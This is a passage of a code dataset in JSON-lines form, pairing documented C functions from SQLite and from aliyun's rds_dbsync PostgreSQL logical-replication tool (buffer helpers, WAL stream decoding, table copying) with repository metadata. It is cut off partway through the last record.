{"docstring": "/*\n** pExpr points to an expression which implements a function.  If\n** it is appropriate to apply the LIKE optimization to that function\n** then set aWc[0] through aWc[2] to the wildcard characters and the\n** escape character and then return TRUE.  If the function is not a\n** LIKE-style function then return FALSE.\n**\n** The expression \"a LIKE b ESCAPE c\" is only considered a valid LIKE\n** operator if c is a string literal that is exactly one byte in length.\n** That one byte is stored in aWc[3].  aWc[3] is set to zero if there is\n** no ESCAPE clause.\n**\n** *pIsNocase is set to true if uppercase and lowercase are equivalent for\n** the function (default for LIKE).  If the function makes the distinction\n** between uppercase and lowercase (as does GLOB) then *pIsNocase is set to\n** false.\n*/\n", "func_signal": "SQLITE_PRIVATE int sqlite3IsLikeFunction(sqlite3 *db, Expr *pExpr, int *pIsNocase, char *aWc)", "code": "{\n  FuncDef *pDef;\n  int nExpr;\n  if( pExpr->op!=TK_FUNCTION || !pExpr->x.pList ){\n    return 0;\n  }\n  assert( !ExprHasProperty(pExpr, EP_xIsSelect) );\n  nExpr = pExpr->x.pList->nExpr;\n  pDef = sqlite3FindFunction(db, pExpr->u.zToken, nExpr, SQLITE_UTF8, 0);\n#ifdef SQLITE_ENABLE_UNKNOWN_SQL_FUNCTION\n  if( pDef==0 ) return 0;\n#endif\n  if( NEVER(pDef==0) || (pDef->funcFlags & SQLITE_FUNC_LIKE)==0 ){\n    return 0;\n  }\n\n  /* The memcpy() statement assumes that the wildcard characters are\n  ** the first three statements in the compareInfo structure.  The\n  ** asserts() that follow verify that assumption\n  */\n  memcpy(aWc, pDef->pUserData, 3);\n  assert( (char*)&likeInfoAlt == (char*)&likeInfoAlt.matchAll );\n  assert( &((char*)&likeInfoAlt)[1] == (char*)&likeInfoAlt.matchOne );\n  assert( &((char*)&likeInfoAlt)[2] == (char*)&likeInfoAlt.matchSet );\n\n  if( nExpr<3 ){\n    aWc[3] = 0;\n  }else{\n    Expr *pEscape = pExpr->x.pList->a[2].pExpr;\n    char *zEscape;\n    if( pEscape->op!=TK_STRING ) return 0;\n    zEscape = pEscape->u.zToken;\n    if( zEscape[0]==0 || zEscape[1]!=0 ) return 0;\n    if( zEscape[0]==aWc[0] ) return 0;\n    if( zEscape[0]==aWc[1] ) return 0;\n    aWc[3] = zEscape[0];\n  }\n\n  *pIsNocase = (pDef->funcFlags & SQLITE_FUNC_CASE)==0;\n  return 1;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Return the declared type of a column.  Or return zDflt if the column\n** has no declared type.\n**\n** The column type is an extra string stored after the zero-terminator on\n** the column name if and only if the COLFLAG_HASTYPE flag is set.\n*/\n", "func_signal": "SQLITE_PRIVATE char *sqlite3ColumnType(Column *pCol, char *zDflt)", "code": "{\n  if( (pCol->colFlags & COLFLAG_HASTYPE)==0 ) return zDflt;\n  return pCol->zName + strlen(pCol->zName) + 1;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Recursively delete a Trigger structure\n*/\n", "func_signal": "SQLITE_PRIVATE void sqlite3DeleteTrigger(sqlite3 *db, Trigger *pTrigger)", "code": "{\n  if( pTrigger==0 ) return;\n  sqlite3DeleteTriggerStep(db, pTrigger->step_list);\n  sqlite3DbFree(db, pTrigger->zName);\n  sqlite3DbFree(db, pTrigger->table);\n  sqlite3ExprDelete(db, pTrigger->pWhen);\n  sqlite3IdListDelete(db, pTrigger->pColumns);\n  sqlite3DbFree(db, pTrigger);\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n** Close a blob handle that was previously created using\n** sqlite3_blob_open().\n*/\n", "func_signal": "SQLITE_API int sqlite3_blob_close(sqlite3_blob *pBlob)", "code": "{\n  Incrblob *p = (Incrblob *)pBlob;\n  int rc;\n  sqlite3 *db;\n\n  if( p ){\n    sqlite3_stmt *pStmt = p->pStmt;\n    db = p->db;\n    sqlite3_mutex_enter(db->mutex);\n    sqlite3DbFree(db, p);\n    sqlite3_mutex_leave(db->mutex);\n    rc = sqlite3_finalize(pStmt);\n  }else{\n    rc = SQLITE_OK;\n  }\n  return rc;\n}", "path": "sqlite-gui/include/sqlite3.c", "commit_date": "2020-12-10 00:00:00", "repo_name": "little-brother/sqlite-gui", "stars": 1022, "license": "gpl-2.0", "language": "c", "size": 42080}
{"docstring": "/*\n * Process a commit message from the output plugin, advance replication\n * identifiers, commit the local transaction, and determine whether replay\n * should continue.\n *\n * Returns true if apply should continue with the next record, false if replay\n * should stop after this record.\n */\n", "func_signal": "static bool\nprocess_remote_commit(StringInfo s, ALI_PG_DECODE_MESSAGE *msg)", "code": "{\n\tXLogRecPtr\t\tcommit_lsn;\n\tTimestampTz\t\tcommittime;\n\tTimestampTz\t\tend_lsn;\n\tint\t\t\t\tflags;\n\n\tflags = pq_getmsgint(s, 4);\n\n\tif (flags != 0)\n\t{\n\t\tfprintf(stderr, \"Commit flags are currently unused, but flags was set to %i\", flags);\n\t\treturn false;\n\t}\n\n\t/* order of access to fields after flags is important */\n\tcommit_lsn = pq_getmsgint64(s);\n\tend_lsn = pq_getmsgint64(s);\n\tcommittime = pq_getmsgint64(s);\n\n\tmsg->type = MSGKIND_COMMIT;\n\tmsg->lsn = commit_lsn;\n\tmsg->tm = committime;\n\tmsg->end_lsn = end_lsn;\n\n\treturn true;\n}", "path": "rds_dbsync/dbsync/pg_logicaldecode.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * appendStringInfoSpaces\n *\n * Append the specified number of spaces to a buffer.\n */\n", "func_signal": "void\nappendStringInfoSpaces(StringInfo str, int count)", "code": "{\n\tif (count > 0)\n\t{\n\t\t/* Make more room if needed */\n\t\tenlargeStringInfo(str, count);\n\n\t\t/* OK, append the spaces */\n\t\twhile (--count >= 0)\n\t\t\tstr->data[str->len++] = ' ';\n\t\tstr->data[str->len] = '\\0';\n\t}\n}", "path": "rds_dbsync/dbsync/stringinfo.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/* Case insensitive string compare */\n", "func_signal": "static int strcmpci(const char *a, const char *b)", "code": "{\n  for (;;) {\n    int d = tolower(*a) - tolower(*b);\n    if (d != 0 || !*a) {\n      return d;\n    }\n    a++, b++;\n  }\n}", "path": "rds_dbsync/dbsync/ini.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * enlargeStringInfo\n *\n * Make sure there is enough space for 'needed' more bytes\n * ('needed' does not include the terminating null).\n *\n * External callers usually need not concern themselves with this, since\n * all stringinfo.c routines do it automatically.  However, if a caller\n * knows that a StringInfo will eventually become X bytes large, it\n * can save some palloc overhead by enlarging the buffer before starting\n * to store data in it.\n *\n * NB: because we use repalloc() to enlarge the buffer, the string buffer\n * will remain allocated in the same memory context that was current when\n * initStringInfo was called, even if another context is now current.\n * This is the desired and indeed critical behavior!\n */\n", "func_signal": "void\nenlargeStringInfo(StringInfo str, int needed)", "code": "{\n\tint\t\t\tnewlen;\n\n\t/*\n\t * Guard against out-of-range \"needed\" values.  Without this, we can get\n\t * an overflow or infinite loop in the following.\n\t */\n\tif (needed < 0)\t\t\t\t/* should not happen */\n\t{\n\t\tfprintf(stderr, \"invalid string enlargement request size: %d\", needed);\n\t\treturn;\n\t}\n\tif (((Size) needed) >= (MaxAllocSize - (Size) str->len))\n\t{\n\t\tfprintf(stderr,\"Cannot enlarge string buffer containing %d bytes by %d more bytes.\",\n\t\t\t\t\t\t   str->len, needed);\n\t\treturn;\n\t}\n\n\tneeded += str->len + 1;\t\t/* total space required now */\n\n\t/* Because of the above test, we now have needed <= MaxAllocSize */\n\n\tif (needed <= str->maxlen)\n\t\treturn;\t\t\t\t\t/* got enough space already */\n\n\t/*\n\t * We don't want to allocate just a little more space with each append;\n\t * for efficiency, double the buffer size each time it overflows.\n\t * Actually, we might need to more than double it if 'needed' is big...\n\t */\n\tnewlen = 2 * str->maxlen;\n\twhile (needed > newlen)\n\t\tnewlen = 2 * newlen;\n\n\t/*\n\t * Clamp to MaxAllocSize in case we went past it.  Note we are assuming\n\t * here that MaxAllocSize <= INT_MAX/2, else the above loop could\n\t * overflow.  We will still have newlen >= needed.\n\t */\n\tif (newlen > (int) MaxAllocSize)\n\t\tnewlen = (int) MaxAllocSize;\n\n\tstr->data = (char *) repalloc(str->data, newlen);\n\n\tstr->maxlen = newlen;\n}", "path": "rds_dbsync/dbsync/stringinfo.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * Read a remote action type and process the action record.\n *\n * May set got_SIGTERM to stop processing before next record.\n */\n", "func_signal": "bool\nbdr_process_remote_action(StringInfo s, ALI_PG_DECODE_MESSAGE *msg)", "code": "{\n\tchar action = pq_getmsgbyte(s);\n\tbool\trc = false;\n\n\tswitch (action)\n\t{\n\t\t\t/* BEGIN */\n\t\tcase 'B':\n\t\t\trc = process_remote_begin(s,msg);\n\t\t\tbreak;\n\t\t\t/* COMMIT */\n\t\tcase 'C':\n\t\t\trc = process_remote_commit(s,msg);\n\t\t\tbreak;\n\t\t\t/* INSERT */\n\t\tcase 'I':\n\t\t\trc = process_remote_insert(s,msg);\n\t\t\tbreak;\n\t\t\t/* UPDATE */\n\t\tcase 'U':\n\t\t\trc = process_remote_update(s,msg);\n\t\t\tbreak;\n\t\t\t/* DELETE */\n\t\tcase 'D':\n\t\t\trc = process_remote_delete(s,msg);\n\t\t\tbreak;\n\t\tdefault:\n\t\t{\n\t\t\tfprintf(stderr, \"unknown action of type %c\", action);\n\t\t\treturn false;\n\t\t}\n\t}\n\n\treturn true;\n}", "path": "rds_dbsync/dbsync/pg_logicaldecode.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * Send a Standby Status Update message to server.\n */\n", "func_signal": "bool\nsendFeedback(Decoder_handler *hander, int64 now, bool force, bool replyRequested)", "code": "{\n\tchar\t\treplybuf[1 + 8 + 8 + 8 + 8 + 1];\n\tint\t\t\tlen = 0;\n\n\t/*\n\t * we normally don't want to send superfluous feedbacks, but if it's\n\t * because of a timeout we need to, otherwise wal_sender_timeout will kill\n\t * us.\n\t */\n\tif (!force &&\n\t\thander->last_recvpos == hander->recvpos)\n\t\treturn true;\n\n\tfprintf(stderr,\"%s: confirming recv up to %X/%X, flush to %X/%X (slot %s)\\n\",\n\t\t\t\thander->progname,\n\t\t\t\t(uint32) (hander->recvpos >> 32), (uint32) hander->recvpos,\n\t\t\t\t(uint32) (hander->flushpos >> 32), (uint32) hander->flushpos,\n\t\t\t\thander->replication_slot);\n\n\treplybuf[len] = 'r';\n\tlen += 1;\n\tfe_sendint64(hander->recvpos, &replybuf[len]);\t\t/* write */\n\tlen += 8;\n\tfe_sendint64(hander->flushpos, &replybuf[len]);\t\t/* flush */\n\tlen += 8;\n\tfe_sendint64(InvalidXLogRecPtr, &replybuf[len]);\t/* apply */\n\tlen += 8;\n\tfe_sendint64(now, &replybuf[len]);\t/* sendTime */\n\tlen += 8;\n\treplybuf[len] = replyRequested ? 1 : 0;\t\t/* replyRequested */\n\tlen += 1;\n\n\thander->startpos = hander->recvpos;\n\thander->last_recvpos= hander->recvpos;\n\n\tif (PQputCopyData(hander->conn, replybuf, len) <= 0 || PQflush(hander->conn))\n\t{\n\t\tfprintf(stderr, \"%s: could not send feedback packet: %s\", hander->progname, PQerrorMessage(hander->conn));\n\t\treturn false;\n\t}\n\n\treturn true;\n}", "path": "rds_dbsync/dbsync/utils.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * makeStringInfo\n *\n * Create an empty 'StringInfoData' & return a pointer to it.\n */\n", "func_signal": "StringInfo\nmakeStringInfo(void)", "code": "{\n\tStringInfo\tres;\n\n\tres = (StringInfo) palloc(sizeof(StringInfoData));\n\n\tinitStringInfo(res);\n\n\treturn res;\n}", "path": "rds_dbsync/dbsync/stringinfo.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*----------------------------------------------------------\n * Formatting and conversion routines.\n *---------------------------------------------------------*/\n", "func_signal": "static XLogRecPtr\npg_lsn_in(char *lsn)", "code": "{\n#define MAXPG_LSNCOMPONENT\t8\n\n\tchar\t   *str = lsn;\n\tint\t\t\tlen1,\n\t\t\t\tlen2;\n\tuint32\t\tid,\n\t\t\t\toff;\n\tXLogRecPtr\tresult = 0;\n\n\t/* Sanity check input format. */\n\tlen1 = strspn(str, \"0123456789abcdefABCDEF\");\n\tif (len1 < 1 || len1 > MAXPG_LSNCOMPONENT || str[len1] != '/')\n\t{\n\t\tfprintf(stderr, \"invalid input syntax for type pg_lsn: \\\"%s\\\"\", str);\n\n\t\treturn result;\n\t}\n\tlen2 = strspn(str + len1 + 1, \"0123456789abcdefABCDEF\");\n\tif (len2 < 1 || len2 > MAXPG_LSNCOMPONENT || str[len1 + 1 + len2] != '\\0')\n\t{\n\t\tfprintf(stderr,\"invalid input syntax for type pg_lsn: \\\"%s\\\"\", str);\n\n\t\treturn result;\n\t}\n\n\t/* Decode result. */\n\tid = (uint32) strtoul(str, NULL, 16);\n\toff = (uint32) strtoul(str + len1 + 1, NULL, 16);\n\tresult = ((uint64) id << 32) | off;\n\n\treturn result;\n}", "path": "rds_dbsync/dbsync/utils.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * appendBinaryStringInfo\n *\n * Append arbitrary binary data to a StringInfo, allocating more space\n * if necessary.\n */\n", "func_signal": "void\nappendBinaryStringInfo(StringInfo str, const char *data, int datalen)", "code": "{\n\tAssert(str != NULL);\n\n\t/* Make more room if needed */\n\tenlargeStringInfo(str, datalen);\n\n\t/* OK, append the data */\n\tmemcpy(str->data + str->len, data, datalen);\n\tstr->len += datalen;\n\n\t/*\n\t * Keep a trailing null in place, even though it's probably useless for\n\t * binary data.  (Some callers are dealing with text but call this because\n\t * their input isn't null-terminated.)\n\t */\n\tstr->data[str->len] = '\\0';\n}", "path": "rds_dbsync/dbsync/stringinfo.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * Start the log streaming\n */\n", "func_signal": "ALI_PG_DECODE_MESSAGE *\nexec_logical_decoder(Decoder_handler *hander, volatile bool *time_to_stop)", "code": "{\n\tPGresult   *res = NULL;\n\tint \t\tr;\n\tint64\t\tnow;\n\tint \t\thdr_len;\n\tbool\t\tin_redo = false;\n\tbool\t\trc = false;\n\nredo:\n\n\tif (hander->copybuf != NULL)\n\t{\n\t\tPQfreemem(hander->copybuf);\n\t\thander->copybuf = NULL;\n\t}\n\n    if (*time_to_stop == true)\n    {\n        return NULL;\n    }\n\n\t/*\n\t * Potentially send a status message to the master\n\t */\n\tnow = feGetCurrentTimestamp();\n\tif (in_redo && \n\t\thander->standby_message_timeout > 0 &&\n\t\tfeTimestampDifferenceExceeds(hander->last_status, now,\n\t\t\t\t\t\t\t\t\t hander->standby_message_timeout))\n\t{\n\t\t/* Time to send feedback! */\n\t\tif (!sendFeedback(hander, now, true, false))\n\t\t\tgoto error;\n\n\t\thander->last_status = now;\n\t}\n\n\tr = PQgetCopyData(hander->conn, &hander->copybuf, 1);\n\tif (r == 0)\n\t{\n\t\t/*\n\t\t * In async mode, and no data available. We block on reading but\n\t\t * not more than the specified timeout, so that we can send a\n\t\t * response back to the client.\n\t\t */\n\t\tfd_set\t\tinput_mask;\n\t\tint64\t\tmessage_target = 0;\n\t\tstruct timeval timeout;\n\t\tstruct timeval *timeoutptr = NULL;\n\n\t\tFD_ZERO(&input_mask);\n\t\tFD_SET(PQsocket(hander->conn), &input_mask);\n\n\t\t/* Compute when we need to wakeup to send a keepalive message. */\n\t\tif (hander->standby_message_timeout)\n\t\t\tmessage_target = hander->last_status + (hander->standby_message_timeout - 1) *\n\t\t\t\t((int64) 1000);\n\n\t\t/* Now compute when to wakeup. */\n\t\tif (message_target > 0)\n\t\t{\n\t\t\tint64\t\ttargettime;\n\t\t\tlong\t\tsecs;\n\t\t\tint\t\t\tusecs;\n\n\t\t\ttargettime = message_target;\n\n\t\t\tfeTimestampDifference(now,\n\t\t\t\t\t\t\t\t  targettime,\n\t\t\t\t\t\t\t\t  &secs,\n\t\t\t\t\t\t\t\t  &usecs);\n\t\t\tif (secs <= 0)\n\t\t\t\ttimeout.tv_sec = 1; /* Always sleep at least 1 sec */\n\t\t\telse\n\t\t\t\ttimeout.tv_sec = secs;\n\t\t\ttimeout.tv_usec = usecs;\n\t\t\ttimeoutptr = &timeout;\n\t\t}\n\n\t\tr = select(PQsocket(hander->conn) + 1, &input_mask, NULL, NULL, timeoutptr);\n\t\tif (r == 0 || (r < 0 && errno == EINTR))\n\t\t{\n\t\t\t/*\n\t\t\t * Got a timeout or signal. Continue the loop and either\n\t\t\t * deliver a status packet to the server or just go back into\n\t\t\t * blocking.\n\t\t\t */\n\t\t\tin_redo = true;\n\t\t\tgoto redo;\n\t\t}\n\t\telse if (r < 0)\n\t\t{\n\t\t\tfprintf(stderr, _(\"%s: select() failed: %s\\n\"),\n\t\t\t\t\thander->progname, strerror(errno));\n\t\t\tgoto error;\n\t\t}\n\n\t\t/* Else there is actually data on the socket */\n\t\tif (PQconsumeInput(hander->conn) == 0)\n\t\t{\n\t\t\tfprintf(stderr,\n\t\t\t\t\t_(\"%s: could not receive data from WAL stream: %s\"),\n\t\t\t\t\thander->progname, PQerrorMessage(hander->conn));\n\t\t\tgoto error;\n\t\t}\n\t\tin_redo = true;\n\t\tgoto redo;\n\t}\n\n\t/* End of copy stream */\n\tif (r == -1)\n\t{\n\t\tfprintf(stderr,\n\t\t\t\t\t_(\"%s: End of copy stream\"),\n\t\t\t\t\thander->progname);\n\t\tres = PQgetResult(hander->conn);\n\t\tif (PQresultStatus(res) != PGRES_COMMAND_OK)\n\t\t{\n\t\t\tfprintf(stderr,\n\t\t\t\t\t_(\"%s: unexpected termination of replication stream: %s\"),\n\t\t\t\t\thander->progname, PQresultErrorMessage(res));\n\t\t\tgoto error;\n\t\t}\n\t\tPQclear(res);\n\t\treturn NULL;\n\t}\n\telse if (r == -2)\n\t{\n\t\tfprintf(stderr, _(\"%s: could not read COPY data: %s\"),\n\t\t\t\thander->progname, PQerrorMessage(hander->conn));\n\t\tgoto error;\n\t}\n\telse\n\t{\n\t\tStringInfoData s;\n\t\tchar c;\n\t\t\n\t\tinitStringInfo(&s);\n\t\ts.data = hander->copybuf;\n\t\ts.len = r;\n\t\ts.maxlen = -1;\n\n\t\tc = pq_getmsgbyte(&s);\n\t\n\t\t/* Check the message type. */\n\t\tif (c == 'k')\n\t\t{\n\t\t\tint\t\t\tpos;\n\t\t\tbool\t\treplyRequested;\n\t\t\tXLogRecPtr\twalEnd;\n\n\t\t\t/*\n\t\t\t * Parse the keepalive message, enclosed in the CopyData message.\n\t\t\t * We just check if the server requested a reply, and ignore the\n\t\t\t * rest.\n\t\t\t */\n\t\t\tpos = 1;\t\t\t/* skip msgtype 'k' */\n\t\t\twalEnd = fe_recvint64(&hander->copybuf[pos]);\n\t\t\thander->recvpos = Max(walEnd, hander->recvpos);\n\n\t\t\tpos += 8;\t\t\t/* read walEnd */\n\n\t\t\tpos += 8;\t\t\t/* skip sendTime */\n\n\t\t\tif (r < pos + 1)\n\t\t\t{\n\t\t\t\tfprintf(stderr, _(\"%s: streaming header too small: %d\\n\"),\n\t\t\t\t\t\thander->progname, r);\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t\treplyRequested = hander->copybuf[pos];\n\n\t\t\t/* If the server requested an immediate reply, send one. */\n\t\t\tif (replyRequested)\n\t\t\t{\n\t\t\t\tnow = feGetCurrentTimestamp();\n\t\t\t\tfprintf(stderr, _(\"server requested an immediate reply %s\\n\"), timestamptz_to_str(now));\n\t\t\t\tif (!sendFeedback(hander, now, true, false))\n\t\t\t\t\tgoto error;\n\t\t\t\thander->last_status = now;\n\t\t\t}\n\n\t\t\tgoto redo;\n\t\t}\n\t\telse if (c == 'w')\n\t\t{\n\t\t\n\t\t\tXLogRecPtr\tlast_received = InvalidXLogRecPtr;\n\t\t\tXLogRecPtr\tstart_lsn;\n\t\t\tXLogRecPtr\tend_lsn;\n\n\t\t\t/*\n\t\t\t * Read the header of the XLogData message, enclosed in the CopyData\n\t\t\t * message. We only need the WAL location field (dataStart), the rest\n\t\t\t * of the header is ignored.\n\t\t\t */\n\t\t\thdr_len = 1;\t\t\t/* msgtype 'w' */\n\t\t\thdr_len += 8;\t\t\t/* dataStart */\n\t\t\thdr_len += 8;\t\t\t/* walEnd */\n\t\t\thdr_len += 8;\t\t\t/* sendTime */\n\t\t\tif (r < hdr_len + 1)\n\t\t\t{\n\t\t\t\tfprintf(stderr, _(\"%s: streaming header too small: %d\\n\"),\n\t\t\t\t\t\thander->progname, r);\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t\n\t\t\tstart_lsn = pq_getmsgint64(&s);\n\t\t\tend_lsn = pq_getmsgint64(&s);\n\t\t\tpq_getmsgint64(&s);\n\t\t\n\t\t\tif (last_received < start_lsn)\n\t\t\t\tlast_received = start_lsn;\n\t\t\n\t\t\tif (last_received < end_lsn)\n\t\t\t\tlast_received = end_lsn;\n\n\t\t\thander->recvpos = last_received;\n\t\t\tmemset(&hander->msg, 0, sizeof(ALI_PG_DECODE_MESSAGE));\n\t\t\trc = bdr_process_remote_action(&s, &hander->msg);\n\t\t\tif (rc == false)\n\t\t\t{\n\t\t\t\tgoto error;\n\t\t\t}\n\t\t}\n\t\telse\n\t\t{\n\t\t\tfprintf(stderr, _(\"%s: unrecognized streaming header: \\\"%c\\\"\\n\"),\n\t\t\t\t\thander->progname, hander->copybuf[0]);\n\t\t\tgoto error;\n\t\t}\n\t}\n\n\tnow = feGetCurrentTimestamp();\n\tif (hander->standby_message_timeout > 0 &&\n\t\tfeTimestampDifferenceExceeds(hander->last_status, now,\n\t\t\t\t\t\t\t\t\t hander->standby_message_timeout))\n\t{\n\t\t/* Time to send feedback! */\n\t\tif (!sendFeedback(hander, now, true, false))\n\t\t\tgoto error;\n\n\t\thander->last_status = now;\n\t}\n\t\n\treturn &hander->msg;\n\nerror:\n\n\tif (hander->copybuf != NULL)\n\t{\n\t\tPQfreemem(hander->copybuf);\n\t\thander->copybuf = NULL;\n\t}\n\tPQfinish(hander->conn);\n\thander->conn = NULL;\n\n\treturn NULL;\n}", "path": "rds_dbsync/dbsync/utils.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * initStringInfo\n *\n * Initialize a StringInfoData struct (with previously undefined contents)\n * to describe an empty string.\n */\n", "func_signal": "void\ninitStringInfo(StringInfo str)", "code": "{\n\tint\t\t\tsize = 1024;\t/* initial default buffer size */\n\n\tstr->data = (char *) palloc(size);\n\tstr->maxlen = size;\n\tresetStringInfo(str);\n}", "path": "rds_dbsync/dbsync/stringinfo.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * appendStringInfoVA\n *\n * Attempt to format text data under the control of fmt (an sprintf-style\n * format string) and append it to whatever is already in str.  If successful\n * return zero; if not (because there's not enough space), return an estimate\n * of the space needed, without modifying str.  Typically the caller should\n * pass the return value to enlargeStringInfo() before trying again; see\n * appendStringInfo for standard usage pattern.\n *\n * XXX This API is ugly, but there seems no alternative given the C spec's\n * restrictions on what can portably be done with va_list arguments: you have\n * to redo va_start before you can rescan the argument list, and we can't do\n * that from here.\n */\n", "func_signal": "int\nappendStringInfoVA(StringInfo str, const char *fmt, va_list args)", "code": "{\n\tint\t\t\tavail;\n\tsize_t\t\tnprinted;\n\n\tAssert(str != NULL);\n\n\t/*\n\t * If there's hardly any space, don't bother trying, just fail to make the\n\t * caller enlarge the buffer first.  We have to guess at how much to\n\t * enlarge, since we're skipping the formatting work.\n\t */\n\tavail = str->maxlen - str->len;\n\tif (avail < 16)\n\t\treturn 32;\n\n\tnprinted = pvsnprintf(str->data + str->len, (size_t) avail, fmt, args);\n\n\tif (nprinted < (size_t) avail)\n\t{\n\t\t/* Success.  Note nprinted does not include trailing null. */\n\t\tstr->len += (int) nprinted;\n\t\treturn 0;\n\t}\n\n\t/* Restore the trailing null so that str is unmodified. */\n\tstr->data[str->len] = '\\0';\n\n\t/*\n\t * Return pvsnprintf's estimate of the space needed.  (Although this is\n\t * given as a size_t, we know it will fit in int because it's not more\n\t * than MaxAllocSize.)\n\t */\n\treturn (int) nprinted;\n}", "path": "rds_dbsync/dbsync/stringinfo.c", "commit_date": "2016-08-31 00:00:00", "repo_name": "aliyun/rds_dbsync", "stars": 537, "license": "apache-2.0", "language": "c", "size": 118}
{"docstring": "/*\n * COPY single table over wire.\n */\n", "func_signal": "static void *\ncopy_table_data(void *arg)", "code": "{\n\tThreadArg *args = (ThreadArg *)arg;\n\tThread_hd *hd = args->hd;\n\tPGresult   *res1;\n\tPGresult   *res2;\n\tint\t\t\tbytes;\n\tchar\t   *copybuf;\n\tStringInfoData\tquery;\n\tchar *nspname;\n\tchar *relname;\n\tTask_hd \t*curr = NULL;\n\tTimevalStruct before,\n\t\t\t\t\tafter; \n\tdouble\t\telapsed_msec = 0;\n\n\tPGconn *origin_conn = args->from;\n\tPGconn *target_conn = args->to;\n\n\torigin_conn = pglogical_connect(hd->src, EXTENSION_NAME \"_copy\");\n\tif (origin_conn == NULL)\n\t{\n\t\tfprintf(stderr, \"init src conn failed: %s\", PQerrorMessage(origin_conn));\n\t\treturn NULL;\n\t}\n\t\n\ttarget_conn = pglogical_connect(hd->desc, EXTENSION_NAME \"_copy\");\n\tif (target_conn == NULL)\n\t{\n\t\tfprintf(stderr, \"init desc conn failed: %s\", PQerrorMessage(target_conn));\n\t\treturn NULL;\n\t}\n\t\n\tinitStringInfo(&query);\n\twhile(1)\n\t{\n\t\tint\t\t\tnlist = 0;\n\n\t\tGETTIMEOFDAY(&before);\n\t\tpthread_mutex_lock(&hd->t_lock);\n\t\tnlist = hd->ntask;\n\t\tif (nlist == 1)\n\t\t{\n\t\t  curr = hd->l_task;\n\t\t  hd->l_task = NULL;\n\t\t  hd->ntask = 0;\n\t\t}\n\t\telse if (nlist > 1)\n\t\t{\n\t\t  Task_hd\t*tmp = hd->l_task->next;\n\t\t  curr = hd->l_task;\n\t\t  hd->l_task = tmp;\n\t\t  hd->ntask--;\n\t\t}\n\t\telse\n\t\t{\n\t\t\tcurr = NULL;\n\t\t}\n\n\t\tpthread_mutex_unlock(&hd->t_lock);\n\n\t\tif(curr == NULL)\n\t\t{\n\t\t\tbreak;\n\t\t}\n\n\t\tstart_copy_origin_tx(origin_conn, hd->snapshot, hd->src_version, hd->desc_is_greenplum);\n\t\tstart_copy_target_tx(target_conn, hd->desc_version, hd->desc_is_greenplum);\n\n\t\tnspname = curr->schemaname;\n\t\trelname = curr->relname;\n\n\t\t/* Build COPY TO query. */\n\t\tappendStringInfo(&query, \"COPY %s.%s TO stdout\",\n\t\t\t\t\t\t PQescapeIdentifier(origin_conn, nspname,\n\t\t\t\t\t\t\t\t\t\t\tstrlen(nspname)),\n\t\t\t\t\t\t PQescapeIdentifier(origin_conn, relname,\n\t\t\t\t\t\t\t\t\t\t\tstrlen(relname)));\n\n\t\t/* Execute COPY TO. */\n\t\tres1 = PQexec(origin_conn, query.data);\n\t\tif (PQresultStatus(res1) != PGRES_COPY_OUT)\n\t\t{\n\t\t\tfprintf(stderr,\"table copy failed Query '%s': %s\", \n\t\t\t\t\tquery.data, PQerrorMessage(origin_conn));\n\t\t\tgoto exit;\n\t\t}\n\n\t\t/* Build COPY FROM query. */\n\t\tresetStringInfo(&query);\n\t\tappendStringInfo(&query, \"COPY %s.%s FROM stdin\",\n\t\t\t\t\t\t PQescapeIdentifier(target_conn, nspname,\n\t\t\t\t\t\t\t\t\t\t\tstrlen(nspname)),\n\t\t\t\t\t\t PQescapeIdentifier(target_conn, relname,\n\t\t\t\t\t\t\t\t\t\t\tstrlen(relname)));\n\n\t\t/* Execute COPY FROM. */\n\t\tres2 = PQexec(target_conn, query.data);\n\t\tif (PQresultStatus(res2) != PGRES_COPY_IN)\n\t\t{\n\t\t\tfprintf(stderr,\"table copy failed Query '%s': %s\", \n\t\t\t\tquery.data, PQerrorMessage(target_conn));\n\t\t\tgoto exit;\n\t\t}\n\n\t\twhile ((bytes = PQgetCopyData(origin_conn, &copybuf, false)) > 0)\n\t\t{\n\t\t\tif (PQputCopyData(target_conn, copybuf, bytes) != 1)\n\t\t\t{\n\t\t\t\tfprintf(stderr,\"writing to target table failed destination connection reported: 